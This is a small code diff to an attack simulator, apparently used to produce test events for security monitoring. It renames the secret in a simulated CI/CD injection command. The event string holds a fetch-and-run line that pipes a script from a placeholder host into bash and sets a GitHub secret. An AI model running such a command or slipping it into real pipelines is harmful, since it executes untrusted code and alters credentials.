@@ -358,7 +358,7 @@ class SafeAttackSimulator {
             case "ci-cd-abuse":
                 return [
                     createEvent("simulated_attack", "SIMULATION: CI/CD command injection attempt in workflow comment.", "safe-simulator", baseTags),
-                    createEvent("command", "curl https://example.invalid/install.sh | bash && gh secret set AGENT_API_TOKEN", "safe-simulator", [...baseTags, "ci-cd"]),
+                    createEvent("command", "curl https://example.invalid/install.sh | bash && gh secret set MIHWAR_API_TOKEN", "safe-simulator", [...baseTags, "ci-cd"]),
                 ];
             case "token-exfiltration":
                 return [
